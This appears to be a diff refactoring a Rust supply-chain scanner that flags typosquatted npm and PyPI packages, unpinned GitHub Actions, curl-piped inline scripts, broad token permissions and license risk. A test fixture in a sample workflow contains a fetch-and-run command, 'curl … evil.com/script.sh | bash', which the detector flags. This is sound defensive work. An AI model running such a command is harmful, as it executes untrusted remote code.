@@ -7,13 +7,11 @@
 use std::collections::BTreeMap;
 use std::fmt;
 
-use crate::findings::Severity;
-
 // =============================================================================
 // Types and Enums
 // =============================================================================
 
-    /// Type of supply chain finding
+/// Type of supply chain finding
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum FindingType {
     Typosquat,
@@ -32,17 +30,17 @@ pub enum FindingType {
 impl fmt::Display for FindingType {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            FindingType::Typosquat => write!(f, "Typosquat"),
-            FindingType::KnownVuln => write!(f, "Known Vulnerability"),
-            FindingType::Outdated => write!(f, "Outdated"),
-            FindingType::Unmaintained => write!(f, "Unmaintained"),
-            FindingType::LicenseRisk => write!(f, "License Risk"),
-            FindingType::UnpinnedAction => write!(f, "Unpinned Action"),
-            FindingType::InlineScript => write!(f, "Inline Script"),
-            FindingType::SecretsExposure => write!(f, "Secrets Exposure"),
-            FindingType::BroadPermissions => write!(f, "Broad Permissions"),
-            FindingType::MissingIntegrity => write!(f, "Missing Integrity"),
-            FindingType::Informational => write!(f, "Informational"),
+            Self::Typosquat => write!(f, "Typosquat"),
+            Self::KnownVuln => write!(f, "Known Vulnerability"),
+            Self::Outdated => write!(f, "Outdated"),
+            Self::Unmaintained => write!(f, "Unmaintained"),
+            Self::LicenseRisk => write!(f, "License Risk"),
+            Self::UnpinnedAction => write!(f, "Unpinned Action"),
+            Self::InlineScript => write!(f, "Inline Script"),
+            Self::SecretsExposure => write!(f, "Secrets Exposure"),
+            Self::BroadPermissions => write!(f, "Broad Permissions"),
+            Self::MissingIntegrity => write!(f, "Missing Integrity"),
+            Self::Informational => write!(f, "Informational"),
         }
     }
 }
@@ -60,7 +58,11 @@ pub struct DependencyFinding {
 
 impl fmt::Display for DependencyFinding {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        writeln!(f, "[{}] {} ({}) - {}", self.severity, self.package_name, self.version, self.finding_type)?;
+        writeln!(
+            f,
+            "[{}] {} ({}) - {}",
+            self.severity, self.package_name, self.version, self.finding_type
+        )?;
         writeln!(f, "  Description: {}", self.description)?;
         writeln!(f, "  Remediation: {}", self.remediation)
     }
@@ -98,9 +100,35 @@ pub struct CicdFinding {
 
 impl fmt::Display for CicdFinding {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        writeln!(f, "[{}] {} - {}", self.severity, self.pipeline_file, self.misconfiguration)?;
+        writeln!(
+            f,
+            "[{}] {} - {}",
+            self.severity, self.pipeline_file, self.misconfiguration
+        )?;
         writeln!(f, "  CWE: {}", self.cwe)?;
         writeln!(f, "  Remediation: {}", self.remediation)
+    }
+}
+
+/// Severity levels for supply chain findings.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Severity {
+    Critical,
+    High,
+    Medium,
+    Low,
+    Informational,
+}
+
+impl fmt::Display for Severity {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::Critical => write!(f, "CRITICAL"),
+            Self::High => write!(f, "HIGH"),
+            Self::Medium => write!(f, "MEDIUM"),
+            Self::Low => write!(f, "LOW"),
+            Self::Informational => write!(f, "INFO"),
+        }
     }
 }
 
@@ -141,7 +169,7 @@ impl fmt::Display for DependencyInventory {
         writeln!(f, "  Transitive: {}", self.transitive)?;
         writeln!(f, "  By Ecosystem:")?;
         for (eco, count) in &self.by_ecosystem {
-            writeln!(f, "    {}: {}", eco, count)?;
+            writeln!(f, "    {eco}: {count}")?;
         }
         Ok(())
     }
@@ -153,14 +181,40 @@ impl fmt::Display for DependencyInventory {
 
 /// Well-known npm packages for typosquat detection
 const NPM_POPULAR: &[&str] = &[
-    "lodash", "express", "react", "react-dom", "axios", "webpack",
-    "chalk", "commander", "moment", "underscore", "vue", "angular",
-    "next", "gatsby", "eslint", "prettier", "typescript", "babel",
-    "jest", "mocha", "chai", "redux", "mobx", "jquery", "d3",
-    "three", "socket.io", "passport", "mongoose", "sequelize",
+    "lodash",
+    "express",
+    "react",
+    "react-dom",
+    "axios",
+    "webpack",
+    "chalk",
+    "commander",
+    "moment",
+    "underscore",
+    "vue",
+    "angular",
+    "next",
+    "gatsby",
+    "eslint",
+    "prettier",
+    "typescript",
+    "babel",
+    "jest",
+    "mocha",
+    "chai",
+    "redux",
+    "mobx",
+    "jquery",
+    "d3",
+    "three",
+    "socket.io",
+    "passport",
+    "mongoose",
+    "sequelize",
 ];
 
 /// Analyze package.json for dependency issues
+#[must_use]
 pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
     let mut findings = Vec::new();
 
@@ -175,8 +229,10 @@ pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
                 version: version.clone(),
                 finding_type: FindingType::Typosquat,
                 severity: Severity::High,
-                description: format!("Possible typosquat of popular package '{}'", squat),
-                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
+                description: format!("Possible typosquat of popular package '{squat}'"),
+                remediation: format!(
+                    "Verify this is the intended package, not a typosquat of '{squat}'"
+                ),
             });
         }
 
@@ -193,7 +249,11 @@ pub fn analyze_package_json(content: &str) -> Vec<DependencyFinding> {
         }
 
         // Check for unpinned versions
-        if version.starts_with('^') || version.starts_with('~') || version == "*" || version == "latest" {
+        if version.starts_with('^')
+            || version.starts_with('~')
+            || version == "*"
+            || version == "latest"
+        {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
@@ -216,7 +276,8 @@ fn extract_package_deps(content: &str) -> BTreeMap<String, String> {
     for line in content.lines() {
         let trimmed = line.trim();
 
-        if trimmed.contains("\"dependencies\"") || trimmed.contains("\"devDependencies\"")
+        if trimmed.contains("\"dependencies\"")
+            || trimmed.contains("\"devDependencies\"")
             || trimmed.contains("\"peerDependencies\"")
         {
             in_deps = true;
@@ -248,12 +309,10 @@ fn extract_package_deps(content: &str) -> BTreeMap<String, String> {
 
 /// Check for npm typosquats
 fn check_npm_typosquat(name: &str) -> Option<&'static str> {
-    for &popular in NPM_POPULAR {
-        if is_likely_typosquat(name, popular) {
-            return Some(popular);
-        }
-    }
-    None
+    NPM_POPULAR
+        .iter()
+        .find(|&&popular| is_likely_typosquat(name, popular))
+        .copied()
 }
 
 /// Check if a package name is a likely typosquat of a popular package
@@ -265,12 +324,12 @@ fn is_likely_typosquat(name: &str, popular: &str) -> bool {
 
     // Check common typosquat patterns
     let patterns = [
-        format!("{}js", popular),
-        format!("{}-js", popular),
-        format!("{}-core", popular),
-        format!("{}-utils", popular),
-        format!("{}-lib", popular),
-        format!("{}x", popular),
+        format!("{popular}js"),
+        format!("{popular}-js"),
+        format!("{popular}-core"),
+        format!("{popular}-utils"),
+        format!("{popular}-lib"),
+        format!("{popular}x"),
         popular.replace('e', "a"),
         popular.replace('o', "0"),
         popular.replace('l', "1"),
@@ -301,16 +360,16 @@ fn levenshtein_distance(a: &str, b: &str) -> usize {
 
     let mut matrix = vec![vec![0usize; b_len + 1]; a_len + 1];
 
-    for i in 0..=a_len {
-        matrix[i][0] = i;
+    for (i, row) in matrix.iter_mut().enumerate().take(a_len + 1) {
+        row[0] = i;
     }
-    for j in 0..=b_len {
-        matrix[0][j] = j;
+    for (j, cell) in matrix[0].iter_mut().enumerate().take(b_len + 1) {
+        *cell = j;
     }
 
     for i in 1..=a_len {
         for j in 1..=b_len {
-            let cost = if a_chars[i - 1] == b_chars[j - 1] { 0 } else { 1 };
+            let cost = usize::from(a_chars[i - 1] != b_chars[j - 1]);
             matrix[i][j] = (matrix[i - 1][j] + 1)
                 .min(matrix[i][j - 1] + 1)
                 .min(matrix[i - 1][j - 1] + cost);
@@ -323,7 +382,15 @@ fn levenshtein_distance(a: &str, b: &str) -> usize {
 /// Check for suspicious npm package names
 fn is_suspicious_npm_package(name: &str) -> bool {
     // Check for package names that are common system utilities
-    let suspicious = ["npm", "node", "javascript", "python", "ruby", "perl", "bash"];
+    let suspicious = [
+        "npm",
+        "node",
+        "javascript",
+        "python",
+        "ruby",
+        "perl",
+        "bash",
+    ];
     for &s in &suspicious {
         if name == s {
             return true;
@@ -337,6 +404,7 @@ fn is_suspicious_npm_package(name: &str) -> bool {
 // =============================================================================
 
 /// Analyze Cargo.toml for dependency issues
+#[must_use]
 pub fn analyze_cargo_toml(content: &str) -> Vec<DependencyFinding> {
     let mut findings = Vec::new();
 
@@ -391,7 +459,8 @@ fn extract_cargo_deps(content: &str) -> BTreeMap<String, String> {
     for line in content.lines() {
         let trimmed = line.trim();
 
-        if trimmed == "[dependencies]" || trimmed == "[dev-dependencies]"
+        if trimmed == "[dependencies]"
+            || trimmed == "[dev-dependencies]"
             || trimmed == "[build-dependencies]"
         {
             in_deps = true;
@@ -433,14 +502,39 @@ fn is_suspicious_cargo_crate(name: &str) -> bool {
 
 /// Well-known Python packages for typosquat detection
 const PYTHON_POPULAR: &[&str] = &[
-    "requests", "flask", "django", "numpy", "pandas", "scipy",
-    "matplotlib", "scikit-learn", "tensorflow", "pytorch", "keras",
-    "fastapi", "uvicorn", "sqlalchemy", "celery", "redis", "boto3",
-    "pytest", "black", "isort", "mypy", "pylint", "setuptools",
-    "pip", "wheel", "virtualenv", "click", "rich", "typer",
+    "requests",
+    "flask",
+    "django",
+    "numpy",
+    "pandas",
+    "scipy",
+    "matplotlib",
+    "scikit-learn",
+    "tensorflow",
+    "pytorch",
+    "keras",
+    "fastapi",
+    "uvicorn",
+    "sqlalchemy",
+    "celery",
+    "redis",
+    "boto3",
+    "pytest",
+    "black",
+    "isort",
+    "mypy",
+    "pylint",
+    "setuptools",
+    "pip",
+    "wheel",
+    "virtualenv",
+    "click",
+    "rich",
+    "typer",
 ];
 
 /// Analyze requirements.txt for dependency issues
+#[must_use]
 pub fn analyze_requirements_txt(content: &str) -> Vec<DependencyFinding> {
     let mut findings = Vec::new();
 
@@ -448,19 +542,21 @@ pub fn analyze_requirements_txt(content: &str) -> Vec<DependencyFinding> {
 
     for (name, version) in &deps {
         // Check for typosquats
-        if let Some(squat) = check_python_typosquat(&name) {
+        if let Some(squat) = check_python_typosquat(name) {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
                 finding_type: FindingType::Typosquat,
                 severity: Severity::High,
-                description: format!("Possible typosquat of popular package '{}'", squat),
-                remediation: format!("Verify this is the intended package, not a typosquat of '{}'", squat),
+                description: format!("Possible typosquat of popular package '{squat}'"),
+                remediation: format!(
+                    "Verify this is the intended package, not a typosquat of '{squat}'"
+                ),
             });
         }
 
         // Check for suspicious packages
-        if is_suspicious_python_package(&name) {
+        if is_suspicious_python_package(name) {
             findings.push(DependencyFinding {
                 package_name: name.clone(),
                 version: version.clone(),
@@ -505,7 +601,7 @@ fn extract_requirements_deps(content: &str) -> BTreeMap<String, String> {
         }
 
         // Parse: package==1.2.3 or package>=1.0 or package
-        let parts: Vec<&str> = trimmed.splitn(2, |c| c == '=' || c == '>' || c == '<' || c == '!').collect();
+        let parts: Vec<&str> = trimmed.splitn(2, ['=', '>', '<', '!']).collect();
         if let Some(name) = parts.first() {
             let name = name.trim().to_string();
             let version = if parts.len() > 1 {
@@ -522,12 +618,10 @@ fn extract_requirements_deps(content: &str) -> BTreeMap<String, String> {
 
 /// Check for Python typosquats
 fn check_python_typosquat(name: &str) -> Option<&'static str> {
-    for &popular in PYTHON_POPULAR {
-        if is_likely_typosquat(name, popular) {
-            return Some(popular);
-        }
-    }
-    None
+    PYTHON_POPULAR
+        .iter()
+        .find(|&&popular| is_likely_typosquat(name, popular))
+        .copied()
 }
 
 /// Check for suspicious Python package names
@@ -546,6 +640,7 @@ fn is_suspicious_python_package(name: &str) -> bool {
 // =============================================================================
 
 /// Analyze lock file integrity
+#[must_use]
 pub fn analyze_lock_integrity(content: &str, file_type: &str) -> LockFileIntegrity {
     let total_deps = count_lock_deps(content, file_type);
     let unchecked_deps = count_unchecked_deps(content, file_type);
@@ -554,7 +649,7 @@ pub fn analyze_lock_integrity(content: &str, file_type: &str) -> LockFileIntegri
     let integrity_status = if hash_mismatches > 0 {
         "COMPROMISED".to_string()
     } else if unchecked_deps > 0 {
-        format!("{} dependencies without integrity checks", unchecked_deps)
+        format!("{unchecked_deps} dependencies without integrity checks")
     } else {
         "OK".to_string()
     };
@@ -571,23 +666,19 @@ pub fn analyze_lock_integrity(content: &str, file_type: &str) -> LockFileIntegri
 /// Count dependencies in lock file
 fn count_lock_deps(content: &str, file_type: &str) -> usize {
     match file_type {
-        "package-lock" => content.matches("\"resolved\"").count(),
-        "yarn.lock" => content.matches("\"resolved\"").count(),
-        "Cargo.lock" => content.matches("name = ").count(),
-        "poetry.lock" => content.matches("name = ").count(),
-        _ => content.lines().filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#')).count(),
+        "package-lock" | "yarn.lock" => content.matches("\"resolved\"").count(),
+        "Cargo.lock" | "poetry.lock" => content.matches("name = ").count(),
+        _ => content
+            .lines()
+            .filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#'))
+            .count(),
     }
 }
 
 /// Count dependencies without integrity checks
 fn count_unchecked_deps(content: &str, file_type: &str) -> usize {
     match file_type {
-        "package-lock" => {
-            let total = content.matches("\"resolved\"").count();
-            let with_hash = content.matches("\"integrity\"").count();
-            total.saturating_sub(with_hash)
-        }
-        "yarn.lock" => {
+        "package-lock" | "yarn.lock" => {
             let total = content.matches("\"resolved\"").count();
             let with_hash = content.matches("\"integrity\"").count();
             total.saturating_sub(with_hash)
@@ -633,6 +724,7 @@ fn count_hash_mismatches(content: &str) -> usize {
 // =============================================================================
 
 /// Analyze GitHub Actions workflow for security issues
+#[must_use]
 pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
     let mut findings = Vec::new();
 
@@ -647,15 +739,19 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
             if !after_uses.contains("@sha") && !after_uses.contains("@v") {
                 findings.push(CicdFinding {
                     pipeline_file: "GitHub Actions".to_string(),
-                    misconfiguration: format!("Unpinned action: {}", after_uses),
+                    misconfiguration: format!("Unpinned action: {after_uses}"),
                     severity: Severity::High,
                     cwe: "CWE-829".to_string(),
-                    remediation: "Pin actions to full commit SHA for supply chain safety".to_string(),
+                    remediation: "Pin actions to full commit SHA for supply chain safety"
+                        .to_string(),
                 });
-            } else if after_uses.contains("@latest") || after_uses.ends_with("@v0") || after_uses.ends_with("@v1") {
+            } else if after_uses.contains("@latest")
+                || after_uses.ends_with("@v0")
+                || after_uses.ends_with("@v1")
+            {
                 findings.push(CicdFinding {
                     pipeline_file: "GitHub Actions".to_string(),
-                    misconfiguration: format!("Weakly pinned action: {}", after_uses),
+                    misconfiguration: format!("Weakly pinned action: {after_uses}"),
                     severity: Severity::Medium,
                     cwe: "CWE-829".to_string(),
                     remediation: "Pin to full commit SHA instead of version tags".to_string(),
@@ -666,9 +762,9 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
         // Check for inline scripts in run:
         if trimmed.contains("run:") && (trimmed.contains('|') || trimmed.contains(">-")) {
             // Multi-line script - check next few lines for suspicious commands
-            for j in (i + 1)..lines.len().min(i + 10) {
-                let script_line = lines[j].trim();
-                if script_line.contains("curl") && script_line.contains("|") {
+            for script_line in lines.iter().take(lines.len().min(i + 10)).skip(i + 1) {
+                let script_line = script_line.trim();
+                if script_line.contains("curl") && script_line.contains('|') {
                     findings.push(CicdFinding {
                         pipeline_file: "GitHub Actions".to_string(),
                         misconfiguration: "Inline script pipes curl output".to_string(),
@@ -703,7 +799,9 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
         }
 
         // Check for GITHUB_TOKEN permissions
-        if trimmed.contains("GITHUB_TOKEN") && (trimmed.contains("write-all") || trimmed.contains("contents: write")) {
+        if trimmed.contains("GITHUB_TOKEN")
+            && (trimmed.contains("write-all") || trimmed.contains("contents: write"))
+        {
             findings.push(CicdFinding {
                 pipeline_file: "GitHub Actions".to_string(),
                 misconfiguration: "GITHUB_TOKEN has broad permissions".to_string(),
@@ -733,6 +831,7 @@ pub fn analyze_github_workflow(content: &str) -> Vec<CicdFinding> {
 // =============================================================================
 
 /// Check license risk level
+#[must_use]
 pub fn check_license_risk(license_name: &str) -> LicenseRisk {
     let lower = license_name.to_lowercase();
 
@@ -765,7 +864,7 @@ pub fn check_license_risk(license_name: &str) -> LicenseRisk {
             commercial_use: true,
             notes: "File-level copyleft - only modified files must be MPL".to_string(),
         },
-        "mit" | "mit-0" => LicenseRisk {
+        "mit" | "mit-0" | "bsd-2-clause" | "bsd-3-clause" | "bsd-2" | "bsd-3" => LicenseRisk {
             license_name: license_name.to_string(),
             risk_level: Severity::Low,
             copyleft: false,
@@ -778,13 +877,6 @@ pub fn check_license_risk(license_name: &str) -> LicenseRisk {
             copyleft: false,
             commercial_use: true,
             notes: "Permissive - includes patent grant".to_string(),
-        },
-        "bsd-2-clause" | "bsd-3-clause" | "bsd-2" | "bsd-3" => LicenseRisk {
-            license_name: license_name.to_string(),
-            risk_level: Severity::Low,
-            copyleft: false,
-            commercial_use: true,
-            notes: "Permissive - minimal restrictions".to_string(),
         },
         "isc" => LicenseRisk {
             license_name: license_name.to_string(),
@@ -822,6 +914,7 @@ pub fn check_license_risk(license_name: &str) -> LicenseRisk {
 // =============================================================================
 
 /// Generate dependency inventory from manifest
+#[must_use]
 pub fn generate_inventory(manifest_content: &str, manifest_type: &str) -> DependencyInventory {
     let deps = match manifest_type {
         "package.json" => extract_package_deps(manifest_content),
@@ -866,19 +959,27 @@ mod tests {
             }
         }"#;
         let findings = analyze_package_json(pkg);
-        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat && f.package_name == "lodas"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.finding_type == FindingType::Typosquat && f.package_name == "lodas")
+        );
     }
 
     #[test]
     fn test_detect_typosquat_pypi() {
         let reqs = "requests==2.28.0\nreqeusts==1.0.0\nflask==2.0.0";
         let findings = analyze_requirements_txt(reqs);
-        assert!(findings.iter().any(|f| f.finding_type == FindingType::Typosquat));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.finding_type == FindingType::Typosquat)
+        );
     }
 
     #[test]
     fn test_unpinned_github_action() {
-        let workflow = r#"
+        let workflow = r"
 name: CI
 on: push
 jobs:
@@ -888,9 +989,14 @@ jobs:
       - uses: actions/checkout@v3
       - uses: some-org/some-action@latest
         run: echo hello
-"#;
+";
         let findings = analyze_github_workflow(workflow);
-        assert!(findings.iter().any(|f| f.misconfiguration.contains("Unpinned") || f.misconfiguration.contains("Weakly pinned")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.misconfiguration.contains("Unpinned")
+                    || f.misconfiguration.contains("Weakly pinned"))
+        );
     }
 
     #[test]
@@ -966,7 +1072,7 @@ jobs:
 
     #[test]
     fn test_github_workflow_curl_pipe() {
-        let workflow = r#"
+        let workflow = r"
 name: CI
 on: push
 jobs:
@@ -975,8 +1081,12 @@ jobs:
     steps:
       - run: |
           curl -sSL https://evil.com/script.sh | bash
-"#;
+";
         let findings = analyze_github_workflow(workflow);
-        assert!(findings.iter().any(|f| f.misconfiguration.contains("curl output")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.misconfiguration.contains("curl output"))
+        );
     }
 }
